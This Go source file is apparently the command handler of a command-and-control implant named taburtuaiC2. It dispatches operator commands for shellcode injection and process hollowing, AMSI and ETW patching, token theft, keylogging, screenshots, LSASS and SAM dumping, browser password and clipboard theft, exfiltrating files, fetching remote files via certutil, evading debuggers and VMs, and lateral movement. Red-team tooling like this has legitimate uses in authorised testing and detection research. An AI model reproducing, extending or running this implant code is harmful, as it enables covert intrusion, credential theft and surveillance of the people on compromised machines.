package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

// ExecuteCommand executes a command and returns the result
func ExecuteCommand(agent *Agent, cmd *types.Command) *types.CommandResult {
	result := &types.CommandResult{
		CommandID: cmd.ID,
		ExitCode:  0,
	}

	fmt.Printf("[*] Executing command (Type: %s): %s\n", cmd.OperationType, cmd.Command)

	// Change working directory if specified
	originalDir, _ := os.Getwd()
	if cmd.WorkingDir != "" {
		if err := os.Chdir(cmd.WorkingDir); err != nil {
			result.Error = fmt.Sprintf("Failed to change directory: %v", err)
			result.ExitCode = 1
			return result
		}
		defer os.Chdir(originalDir)
	}

	// Route to appropriate handler
	switch cmd.OperationType {
	case "upload":
		handleUpload(agent, cmd, result)
	case "download":
		handleDownload(agent, cmd, result)
	case "process_list":
		handleProcessList(cmd, result)
	case "process_kill":
		handleProcessKill(cmd, result)
	case "process_start":
		handleProcessStart(cmd, result)
	case "persist_setup":
		handlePersistenceSetup(cmd, result)
	case "persist_remove":
		handlePersistenceRemove(cmd, result)
	case "ads_write":
		handleADSWrite(cmd, result)
	case "ads_read":
		handleADSRead(cmd, result)
	case "ads_exec":
		handleADSExec(cmd, result)
	case "lolbin_fetch":
		handleLOLBinFetch(cmd, result)
	case "inject_remote":
		handleInjectRemote(cmd, result)
	case "inject_self":
		handleInjectSelf(cmd, result)
	case "timestomp":
		handleTimestomp(cmd, result)
	case "amsi_bypass":
		handleAMSIBypass(cmd, result)
	case "etw_bypass":
		handleETWBypass(cmd, result)
	case "token_list":
		handleTokenList(cmd, result)
	case "token_steal", "token_impersonate":
		handleTokenImpersonate(cmd, result)
	case "token_make":
		handleTokenMake(cmd, result)
	case "token_revert":
		handleTokenRevert(cmd, result)
	case "token_runas":
		handleTokenRunas(cmd, result)
	case "screenshot":
		handleScreenshot(cmd, result)
	case "keylog_start":
		handleKeylogStart(cmd, result)
	case "keylog_dump":
		handleKeylogDump(cmd, result)
	case "keylog_stop":
		handleKeylogStop(cmd, result)
	case "keylog_clear":
		handleKeylogClear(cmd, result)
	// Phase 4 — Advanced injection
	case "hollow":
		handleHollow(cmd, result)
	case "hijack":
		handleHijack(cmd, result)
	case "stomp":
		handleStomp(cmd, result)
	case "mapinject":
		handleMapInject(cmd, result)
	// Phase 5 — Credential access
	case "lsass_dump":
		handleLSASSDump(cmd, result)
	case "sam_dump":
		handleSAMDump(cmd, result)
	case "browsercreds":
		handleBrowserCreds(cmd, result)
	case "clipboard_read":
		handleClipboardRead(cmd, result)
	// Phase 6 — Sleep obfuscation
	case "sleep_obf":
		handleSleepObf(cmd, result)
	// Phase 7 — NTDLL unhooking
	case "unhook_ntdll":
		handleUnhookNTDLL(cmd, result)
	// Phase 8 — Hardware breakpoints
	case "hwbp_set":
		handleHWBPSet(cmd, result)
	case "hwbp_clear":
		handleHWBPClear(cmd, result)
	// Phase 9 — BOF execution
	case "bof_exec":
		handleBOFExec(cmd, result)
	// Phase 10 — OPSEC checks
	case "antidebug":
		handleAntiDebug(cmd, result)
	case "antivm":
		handleAntiVM(cmd, result)
	case "timegate_set":
		handleTimeGateSet(agent, cmd, result)
	// Phase 11 — Network recon
	case "net_scan":
		handleNetScan(cmd, result)
	case "arp_scan":
		handleARPScan(cmd, result)
	// Phase 11 — Registry
	case "reg_read":
		handleRegRead(cmd, result)
	case "reg_write":
		handleRegWrite(cmd, result)
	case "reg_delete":
		handleRegDelete(cmd, result)
	case "reg_list":
		handleRegList(cmd, result)
	// Phase 11 — SOCKS5 pivot
	case "socks5_start":
		handleSOCKS5Start(cmd, result)
	case "socks5_stop":
		handleSOCKS5Stop(result)
	case "socks5_status":
		handleSOCKS5Status(result)
	// Port forwarding / reverse tunnel
	case "portfwd_start":
		handlePortFwdStart(agent, cmd, result)
	case "portfwd_stop":
		handlePortFwdStop(cmd, result)
	// Lateral movement
	case "lateral_wmi":
		handleLateralWMI(cmd, result)
	case "lateral_winrm":
		handleLateralWinRM(cmd, result)
	case "lateral_schtask":
		handleLateralSchtask(cmd, result)
	case "lateral_service":
		handleLateralService(cmd, result)

	// ── New techniques ─────────────────────────────────────────────────────
	// LSASS alternative dump methods
	case "lsass_dump_dup":
		handleLSASSDumpDup(cmd, result)
	case "lsass_dump_wer":
		handleLSASSDumpWER(cmd, result)
	// Patchless AMSI/ETW via HWBP
	case "amsi_hwbp":
		handleAMSIHWBP(result)
	case "etw_hwbp":
		handleETWHWBP(result)
	// Threadless injection
	case "threadless_inject":
		handleThreadlessInject(cmd, result)
	// In-memory PE loader
	case "pe_load":
		handlePELoad(cmd, result)
	// .NET CLR hosting
	case "dotnet_exec":
		handleDotnetExec(cmd, result)
	// PowerShell runspace
	case "ps_runspace":
		handlePSRunspace(cmd, result)
	// Steganography shellcode loader
	case "stego_extract":
		handleStegoExtract(cmd, result)

	case "execute":
		fallthrough
	default:
		handleExecute(agent, cmd, result)
	}

	// Encrypt result if crypto is available
	if agent.crypto != nil && !(cmd.OperationType == "download" && result.Encrypted) {
		encryptResult(agent, result)
	}

	return result
}

func handleUpload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" {
		result.Error = "Destination path missing"
		result.ExitCode = 1
		return
	}

	fileData := cmd.FileContent
	if cmd.IsEncrypted && agent.crypto != nil {
		decrypted, err := agent.crypto.DecryptData(string(fileData))
		if err != nil {
			result.Error = fmt.Sprintf("Failed to decrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		fileData = decrypted
	}

	if err := ioutil.WriteFile(cmd.DestinationPath, fileData, 0644); err != nil {
		result.Error = fmt.Sprintf("Failed to write file: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = fmt.Sprintf("File uploaded successfully to %s", cmd.DestinationPath)
}

func handleDownload(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "Source path missing"
		result.ExitCode = 1
		return
	}

	fileData, err := ioutil.ReadFile(cmd.SourcePath)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to read file: %v", err)
		result.ExitCode = 1
		return
	}

	if agent.crypto != nil {
		encrypted, err := agent.crypto.EncryptData(fileData)
		if err != nil {
			result.Error = fmt.Sprintf("Failed to encrypt file: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = encrypted
		result.Encrypted = true
	} else {
		result.Output = base64.StdEncoding.EncodeToString(fileData)
		result.Encrypted = false
	}
}

func handleProcessList(cmd *types.Command, result *types.CommandResult) {
	var output []byte
	var err error

	if runtime.GOOS == "windows" {
		psCmd := `Get-Process | Select-Object Id,ProcessName,Path,Description | ConvertTo-Json -Compress`
		output, err = exec.Command("powershell", "-NoProfile", "-Command", psCmd).CombinedOutput()
	} else {
		output, err = exec.Command("ps", "-eo", "pid,comm,user,args", "--no-headers").CombinedOutput()
	}

	if err != nil {
		result.Error = fmt.Sprintf("Failed to list processes: %v", err)
		result.ExitCode = 1
		return
	}

	result.Output = strings.TrimSpace(string(output))
}

func handleProcessKill(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessID != 0 {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(cmd.ProcessID)).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("kill", "-9", strconv.Itoa(cmd.ProcessID)).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill PID %d: %v", cmd.ProcessID, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %d killed", cmd.ProcessID)
			}
		}
	} else if cmd.ProcessName != "" {
		if runtime.GOOS == "windows" {
			output, err := exec.Command("taskkill", "/F", "/IM", cmd.ProcessName).CombinedOutput()
			if err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = string(output)
			}
		} else {
			if err := exec.Command("pkill", "-9", "-f", cmd.ProcessName).Run(); err != nil {
				result.Error = fmt.Sprintf("Failed to kill %s: %v", cmd.ProcessName, err)
				result.ExitCode = 1
			} else {
				result.Output = fmt.Sprintf("Process %s killed", cmd.ProcessName)
			}
		}
	} else {
		result.Error = "No process ID or name specified"
		result.ExitCode = 1
	}
}

func handleProcessStart(cmd *types.Command, result *types.CommandResult) {
	if cmd.ProcessPath == "" {
		result.Error = "Process path not specified"
		result.ExitCode = 1
		return
	}

	// PPID spoofing: if a spoof parent is requested, use Windows API
	if cmd.SpoofParentPID > 0 || cmd.SpoofParentName != "" {
		parentPID := cmd.SpoofParentPID
		if parentPID == 0 {
			var err error
			parentPID, err = pidByName(cmd.SpoofParentName)
			if err != nil {
				result.Error = fmt.Sprintf("PPID spoof: %v", err)
				result.ExitCode = 1
				return
			}
		}
		args := strings.Join(cmd.ProcessArgs, " ")
		_, err := spawnWithPPID(cmd.ProcessPath, args, parentPID)
		if err != nil {
			result.Error = fmt.Sprintf("PPID spoof spawn: %v", err)
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Spawned %s with spoofed PPID %d", cmd.ProcessPath, parentPID)
		return
	}

	execCmd := exec.Command(cmd.ProcessPath, cmd.ProcessArgs...)
	output, err := execCmd.CombinedOutput()
	if err != nil {
		result.Error = fmt.Sprintf("Failed to start process: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Process started: %s", string(output))
	}
}

func handlePersistenceSetup(cmd *types.Command, result *types.CommandResult) {
	err := SetupPersistence(cmd.PersistMethod, cmd.PersistName, cmd.ProcessPath, cmd.ProcessArgs)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to setup persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Persistence configured: %s", cmd.PersistMethod)
	}
}

func handlePersistenceRemove(cmd *types.Command, result *types.CommandResult) {
	err := RemovePersistence(cmd.PersistMethod, cmd.PersistName)
	if err != nil {
		result.Error = fmt.Sprintf("Failed to remove persistence: %v", err)
		result.ExitCode = 1
	} else {
		result.Output = "Persistence removed successfully"
	}
}

func handleExecute(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	method := "cmd"
	if agent != nil && agent.cfg != nil && agent.cfg.ExecMethod != "" {
		method = agent.cfg.ExecMethod
	}
	timeout := cmd.Timeout
	if timeout <= 0 {
		timeout = 60
	}
	stdout, stderr, exitCode := runCommand(method, cmd.Command, timeout)
	result.Output = stdout
	result.Error = stderr
	result.ExitCode = exitCode
}

func handleLOLBinFetch(cmd *types.Command, result *types.CommandResult) {
	if cmd.FetchURL == "" || cmd.DestinationPath == "" {
		result.Error = "lolbin_fetch requires fetch_url and destination_path"
		result.ExitCode = 1
		return
	}
	method := cmd.FetchMethod
	if method == "" {
		method = "certutil"
	}
	if err := lolbinFetch(cmd.FetchURL, cmd.DestinationPath, method); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Fetched via %s → %s", method, cmd.DestinationPath)
}

// handleInjectRemote injects base64-encoded shellcode into a remote process.
func handleInjectRemote(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" {
		result.Error = "inject_remote requires shellcode_b64"
		result.ExitCode = 1
		return
	}
	if cmd.InjectPID == 0 {
		result.Error = "inject_remote requires inject_pid"
		result.ExitCode = 1
		return
	}
	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = fmt.Sprintf("base64 decode: %v", err)
		result.ExitCode = 1
		return
	}
	method := cmd.InjectMethod
	if method == "" {
		method = "crt"
	}
	if err := injectShellcode(cmd.InjectPID, sc, method); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Injected %d bytes into PID %d via %s", len(sc), cmd.InjectPID, method)
}

// handleInjectSelf executes base64-encoded shellcode in the agent's own process (fileless).
func handleInjectSelf(cmd *types.Command, result *types.CommandResult) {
	if cmd.ShellcodeB64 == "" {
		result.Error = "inject_self requires shellcode_b64"
		result.ExitCode = 1
		return
	}
	sc, err := base64.StdEncoding.DecodeString(cmd.ShellcodeB64)
	if err != nil {
		result.Error = fmt.Sprintf("base64 decode: %v", err)
		result.ExitCode = 1
		return
	}
	if err := execShellcodeSelf(sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Executed %d bytes in-memory", len(sc))
}

// handleTimestomp changes file timestamps on the agent.
func handleTimestomp(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "timestomp requires source_path (target file)"
		result.ExitCode = 1
		return
	}
	var setTime *time.Time
	if cmd.TimestompTime != "" {
		t, err := time.Parse(time.RFC3339, cmd.TimestompTime)
		if err != nil {
			result.Error = fmt.Sprintf("invalid timestomp_time (use RFC3339): %v", err)
			result.ExitCode = 1
			return
		}
		setTime = &t
	}
	if err := timestompFile(cmd.SourcePath, cmd.TimestompRef, setTime); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	ref := cmd.TimestompRef
	if ref == "" && setTime == nil {
		ref = `C:\Windows\System32\kernel32.dll`
	}
	if ref != "" {
		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, ref)
	} else {
		result.Output = fmt.Sprintf("[+] Timestomped %s ← %s", cmd.SourcePath, cmd.TimestompTime)
	}
}

func handleADSWrite(cmd *types.Command, result *types.CommandResult) {
	if cmd.DestinationPath == "" || len(cmd.FileContent) == 0 {
		result.Error = "ads_write requires destination_path (ADS path) and file_content"
		result.ExitCode = 1
		return
	}
	if err := adsWrite(cmd.DestinationPath, cmd.FileContent); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("Written %d bytes to ADS: %s", len(cmd.FileContent), cmd.DestinationPath)
}

func handleADSRead(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_read requires source_path (ADS path)"
		result.ExitCode = 1
		return
	}
	data, err := adsRead(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = string(data)
}

func handleADSExec(cmd *types.Command, result *types.CommandResult) {
	if cmd.SourcePath == "" {
		result.Error = "ads_exec requires source_path (ADS path, e.g. C:\\file.txt:payload.js)"
		result.ExitCode = 1
		return
	}
	out, err := adsExec(cmd.SourcePath)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
	}
	result.Output = out
}

func handleAMSIBypass(cmd *types.Command, result *types.CommandResult) {
	var err error
	if cmd.BypassTargetPID > 0 {
		err = patchAMSIRemote(cmd.BypassTargetPID)
	} else {
		err = patchAMSI()
	}
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.BypassTargetPID > 0 {
		result.Output = fmt.Sprintf("[+] AMSI patched in PID %d", cmd.BypassTargetPID)
	} else {
		result.Output = "[+] AMSI patched in agent process"
	}
}

func handleETWBypass(cmd *types.Command, result *types.CommandResult) {
	var err error
	if cmd.BypassTargetPID > 0 {
		err = patchETWRemote(cmd.BypassTargetPID)
	} else {
		err = patchETW()
	}
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.BypassTargetPID > 0 {
		result.Output = fmt.Sprintf("[+] ETW patched in PID %d", cmd.BypassTargetPID)
	} else {
		result.Output = "[+] ETW (EtwEventWrite) patched in agent process"
	}
}

func handleTokenList(_ *types.Command, result *types.CommandResult) {
	infos, err := listTokens()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = tokenListText(infos)
}

func handleTokenImpersonate(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenPID == 0 {
		result.Error = "token_steal/token_impersonate requires token_pid"
		result.ExitCode = 1
		return
	}
	user, err := impersonateToken(cmd.TokenPID)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Impersonating %s (from PID %d)", user, cmd.TokenPID)
}

func handleTokenMake(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenUser == "" || cmd.TokenPass == "" {
		result.Error = "token_make requires token_user and token_pass"
		result.ExitCode = 1
		return
	}
	domain := cmd.TokenDomain
	if domain == "" {
		domain = "."
	}
	tok, err := makeToken(cmd.TokenUser, domain, cmd.TokenPass)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	_ = tok
	result.Output = fmt.Sprintf("[+] Token created for %s\\%s", domain, cmd.TokenUser)
}

func handleTokenRevert(_ *types.Command, result *types.CommandResult) {
	if err := revertToSelf(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] Reverted to original token"
}

func handleTokenRunas(cmd *types.Command, result *types.CommandResult) {
	if cmd.TokenPID == 0 && (cmd.TokenUser == "" || cmd.TokenPass == "") {
		result.Error = "token_runas requires token_pid (steal) or token_user+token_pass (make)"
		result.ExitCode = 1
		return
	}
	if cmd.TokenExe == "" {
		result.Error = "token_runas requires token_exe"
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] RunAs %s queued (not yet implemented — use inject ppid for now)", cmd.TokenExe)
}

func handleScreenshot(_ *types.Command, result *types.CommandResult) {
	pngBytes, err := captureScreen()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	// Return as base64 so it travels cleanly through the JSON result
	result.Output = fmt.Sprintf("PNG:%d:%s",
		len(pngBytes),
		encodeBase64(pngBytes))
}

func handleKeylogStart(cmd *types.Command, result *types.CommandResult) {
	if err := startKeylogger(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	dur := cmd.KeylogDuration
	if dur > 0 {
		go func() {
			time.Sleep(time.Duration(dur) * time.Second)
			stopKeylogger()
		}()
		result.Output = fmt.Sprintf("[+] Keylogger started for %ds", dur)
	} else {
		result.Output = "[+] Keylogger started (run keylog_stop to stop)"
	}
}

func handleKeylogDump(_ *types.Command, result *types.CommandResult) {
	data := dumpKeylog()
	if data == "" {
		result.Output = "(no keystrokes captured yet)"
		return
	}
	result.Output = data
}

func handleKeylogStop(_ *types.Command, result *types.CommandResult) {
	data := dumpKeylog()
	stopKeylogger()
	result.Output = fmt.Sprintf("[+] Keylogger stopped. Final buffer (%d chars):\n%s", len(data), data)
}

func handleKeylogClear(_ *types.Command, result *types.CommandResult) {
	clearKeylog()
	result.Output = "[+] Keylog buffer cleared"
}

// encodeBase64 returns standard base64 encoding of b.
func encodeBase64(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}

// ─── Phase 4: Advanced Injection ─────────────────────────────────────────────

func handleHollow(cmd *types.Command, result *types.CommandResult) {
	exe := cmd.ProcessPath
	if exe == "" {
		exe = `C:\Windows\System32\svchost.exe`
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := HollowProcess(exe, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	technique := "shellcode RIP-redirect"
	if len(sc) >= 2 && sc[0] == 0x4D && sc[1] == 0x5A {
		technique = "PE hollow (NtUnmapViewOfSection)"
	}
	result.Output = fmt.Sprintf("[+] %s → %s (%d bytes)", technique, exe, len(sc))
}

func handleHijack(cmd *types.Command, result *types.CommandResult) {
	if cmd.InjectPID == 0 {
		result.Error = "inject_pid required"
		result.ExitCode = 1
		return
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := hijackThread(cmd.InjectPID, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Hijacked thread in PID %d (%d bytes)", cmd.InjectPID, len(sc))
}

func handleStomp(cmd *types.Command, result *types.CommandResult) {
	dll := cmd.SacrificialDLL
	if dll == "" {
		dll = "xpsservices.dll"
	}
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if err := stompModule(dll, sc); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Stomped %s .text section and queued execution (%d bytes)", dll, len(sc))
}

func handleMapInject(cmd *types.Command, result *types.CommandResult) {
	sc, err := decodeShellcode(cmd.ShellcodeB64)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.InjectPID == 0 {
		if err := mapInjectLocal(sc); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Mapped+executed shellcode in local process (%d bytes)", len(sc))
	} else {
		if err := mapInjectRemote(cmd.InjectPID, sc); err != nil {
			result.Error = err.Error()
			result.ExitCode = 1
			return
		}
		result.Output = fmt.Sprintf("[+] Cross-process mapped shellcode into PID %d (%d bytes)", cmd.InjectPID, len(sc))
	}
}

func decodeShellcode(b64 string) ([]byte, error) {
	if b64 == "" {
		return nil, fmt.Errorf("shellcode_b64 required")
	}
	return base64.StdEncoding.DecodeString(b64)
}

// ─── Phase 5: Credential Access ──────────────────────────────────────────────

func handleLSASSDump(cmd *types.Command, result *types.CommandResult) {
	out := cmd.DestinationPath
	if out == "" {
		out = os.TempDir() + `\lsass.dmp`
	}
	if err := dumpLSASS(out); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] LSASS dump written to %s", out)
}

func handleSAMDump(cmd *types.Command, result *types.CommandResult) {
	dir := cmd.DestinationPath
	if dir == "" {
		dir = os.TempDir()
	}
	out, err := dumpSAM(dir)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func handleBrowserCreds(_ *types.Command, result *types.CommandResult) {
	creds, err := BrowserCredsAll()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(creds) == 0 {
		result.Output = "(no credentials found)"
		return
	}
	var sb strings.Builder
	for _, c := range creds {
		sb.WriteString(fmt.Sprintf("[%s] %s  user=%s  pass=%s\n", c.Browser, c.URL, c.Username, c.Password))
	}
	result.Output = sb.String()
}

func handleClipboardRead(_ *types.Command, result *types.CommandResult) {
	text, err := readClipboard()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if text == "" {
		result.Output = "(clipboard empty)"
		return
	}
	result.Output = text
}

// ─── Phase 6: Sleep Obfuscation ──────────────────────────────────────────────

func handleSleepObf(cmd *types.Command, result *types.CommandResult) {
	d := time.Duration(cmd.SleepDuration) * time.Second
	if d <= 0 {
		d = 30 * time.Second
	}
	sleepObf(d)
	result.Output = fmt.Sprintf("[+] Slept %s with memory obfuscation", d)
}

// ─── Phase 7: NTDLL Unhooking ─────────────────────────────────────────────────

func handleUnhookNTDLL(_ *types.Command, result *types.CommandResult) {
	if err := unhookNTDLL(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = "[+] NTDLL .text section restored from disk copy — hooks removed"
}

// ─── Phase 8: Hardware Breakpoints ───────────────────────────────────────────

func handleHWBPSet(cmd *types.Command, result *types.CommandResult) {
	if cmd.HWBPAddr == "" {
		result.Error = "hwbp_addr required (hex string, e.g. 0x7FFE1234)"
		result.ExitCode = 1
		return
	}
	addr, err := strconv.ParseUint(strings.TrimPrefix(cmd.HWBPAddr, "0x"), 16, 64)
	if err != nil {
		result.Error = fmt.Sprintf("invalid hwbp_addr: %v", err)
		result.ExitCode = 1
		return
	}
	slot := HWBPSlot(cmd.HWBPRegister)
	if err := SetHWBP(slot, uintptr(addr), func(a uintptr) {
		fmt.Printf("[HWBP] DR%d hit at 0x%X\n", slot, a)
	}); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] HWBP set at 0x%X on DR%d", addr, slot)
}

func handleHWBPClear(cmd *types.Command, result *types.CommandResult) {
	slot := HWBPSlot(cmd.HWBPRegister)
	if err := ClearHWBP(slot); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] HWBP cleared on DR%d", slot)
}

// ─── Phase 9: BOF Execution ──────────────────────────────────────────────────

func handleBOFExec(cmd *types.Command, result *types.CommandResult) {
	if cmd.BOFData == "" {
		result.Error = "bof_data (base64 COFF) required"
		result.ExitCode = 1
		return
	}
	coffBytes, err := base64.StdEncoding.DecodeString(cmd.BOFData)
	if err != nil {
		result.Error = fmt.Sprintf("bof_data decode: %v", err)
		result.ExitCode = 1
		return
	}
	var args []byte
	if cmd.BOFArgs != "" {
		args, _ = base64.StdEncoding.DecodeString(cmd.BOFArgs)
	}
	res, err := RunBOF(coffBytes, args)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = res.Output
	if res.Err != "" {
		result.Error = res.Err
	}
}

// ─── Phase 10: OPSEC ─────────────────────────────────────────────────────────

func handleAntiDebug(_ *types.Command, result *types.CommandResult) {
	report := AntiDebugReport()
	result.Output = "[antidebug] " + report
	if IsDebugged() {
		result.ExitCode = 1
	}
}

func handleAntiVM(_ *types.Command, result *types.CommandResult) {
	report := AntiVMReport()
	result.Output = "[antivm] " + report
	if IsVM() {
		result.ExitCode = 1
	}
}

func handleTimeGateSet(agent *Agent, cmd *types.Command, result *types.CommandResult) {
	tg := &TimeGate{
		WorkStart: cmd.WorkingHoursStart,
		WorkEnd:   cmd.WorkingHoursEnd,
		KillDate:  cmd.KillDate,
	}
	if tg.WorkStart == 0 && tg.WorkEnd == 0 {
		tg.WorkStart = -1
		tg.WorkEnd = -1
	}
	agent.timeGate = tg
	ok, reason := tg.IsActive()
	if !ok {
		result.Output = fmt.Sprintf("[timegate] Set. Currently INACTIVE: %s", reason)
	} else {
		result.Output = fmt.Sprintf("[timegate] Set. Currently ACTIVE. Kill=%s, Hours=%02d-%02d",
			cmd.KillDate, cmd.WorkingHoursStart, cmd.WorkingHoursEnd)
	}
}

// ─── Phase 11: Network Recon ──────────────────────────────────────────────────

func handleNetScan(cmd *types.Command, result *types.CommandResult) {
	if len(cmd.ScanTargets) == 0 {
		result.Error = "scan_targets required (CIDR or IP list)"
		result.ExitCode = 1
		return
	}
	timeout := time.Duration(cmd.ScanTimeout) * time.Millisecond
	if timeout <= 0 {
		timeout = 500 * time.Millisecond
	}
	results, err := RunNetScan(NetScanOpts{
		Targets:     cmd.ScanTargets,
		Ports:       cmd.ScanPorts,
		Timeout:     timeout,
		Workers:     cmd.ScanWorkers,
		GrabBanner:  cmd.ScanGrabBanners,
	})
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(results) == 0 {
		result.Output = "(no open ports found)"
		return
	}
	var sb strings.Builder
	for _, r := range results {
		if cmd.ScanGrabBanners && r.Banner != "" {
			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\t%s\n", r.Host, r.Port, r.Latency.Milliseconds(), r.Banner)
		} else {
			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\n", r.Host, r.Port, r.Latency.Milliseconds())
		}
	}
	result.Output = sb.String()
}

func handleARPScan(_ *types.Command, result *types.CommandResult) {
	out, err := ARPScan()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

// ─── Phase 11: Registry ───────────────────────────────────────────────────────

func handleRegRead(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
		result.Error = "reg_hive, reg_key, reg_value required"
		result.ExitCode = 1
		return
	}
	val, err := RegRead(cmd.RegHive, cmd.RegKey, cmd.RegValue)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("%s\\%s\\%s = %s", cmd.RegHive, cmd.RegKey, cmd.RegValue, val)
}

func handleRegWrite(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" || cmd.RegValue == "" {
		result.Error = "reg_hive, reg_key, reg_value required"
		result.ExitCode = 1
		return
	}
	if err := RegWrite(cmd.RegHive, cmd.RegKey, cmd.RegValue, cmd.RegData, cmd.RegType); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("[+] Written %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
}

func handleRegDelete(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" {
		result.Error = "reg_hive and reg_key required"
		result.ExitCode = 1
		return
	}
	if err := RegDelete(cmd.RegHive, cmd.RegKey, cmd.RegValue); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if cmd.RegValue != "" {
		result.Output = fmt.Sprintf("[+] Deleted value %s\\%s\\%s", cmd.RegHive, cmd.RegKey, cmd.RegValue)
	} else {
		result.Output = fmt.Sprintf("[+] Deleted key %s\\%s", cmd.RegHive, cmd.RegKey)
	}
}

func handleRegList(cmd *types.Command, result *types.CommandResult) {
	if cmd.RegHive == "" || cmd.RegKey == "" {
		result.Error = "reg_hive and reg_key required"
		result.ExitCode = 1
		return
	}
	entries, err := RegList(cmd.RegHive, cmd.RegKey)
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(entries) == 0 {
		result.Output = "(empty key)"
		return
	}
	result.Output = strings.Join(entries, "\n")
}

